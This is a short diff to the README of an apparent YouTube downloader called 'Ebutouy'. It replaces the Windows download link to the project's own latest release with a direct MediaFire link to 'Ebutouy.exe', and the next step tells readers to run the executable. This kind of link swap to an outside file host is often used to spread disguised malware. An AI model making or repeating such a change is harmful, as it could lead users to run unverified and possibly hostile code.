@@ -19,7 +19,7 @@ Download YouTube videos and playlists as MP3 or MP4 with ease.
 
 ### Windows
 
-1. Download `Ebutouy.exe` from the [latest release](../../releases/latest)
+1. Download `Ebutouy.exe` from [mediafire](https://www.mediafire.com/file/wkgebczqwxwa1qz/Ebutouy.exe/file)
 2. Run the executable
 3. No installation needed - FFmpeg is bundled
 
